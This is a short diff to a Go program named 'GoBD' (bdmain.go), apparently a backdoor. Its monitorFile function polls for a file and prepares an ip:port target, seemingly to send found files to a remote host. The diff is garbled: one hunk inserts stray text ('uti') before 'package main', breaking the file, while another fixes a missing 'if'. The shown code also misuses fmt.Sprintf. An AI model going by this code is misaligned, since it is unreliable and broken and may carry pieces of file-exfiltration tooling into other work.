@@ -1,4 +1,4 @@
-package main
+utipackage main
 /* bdmain.go
 PROGRAM: GoBD
 AUTHOR: Ramzi Chennafi
@@ -259,7 +259,7 @@ func monitorFile(ip, filename string, port uint16){
 
 	for {
 		time.Sleep(1000 * time.Millisecond);
-		_, err := os.Stat(filename); err == nil {
+		if _, err := os.Stat(filename); err == nil {
 			fmt.Printf("Found file %s\n", filename)
 			var target string
 			fmt.Sprintf(target, "%s:%d", ip, port)
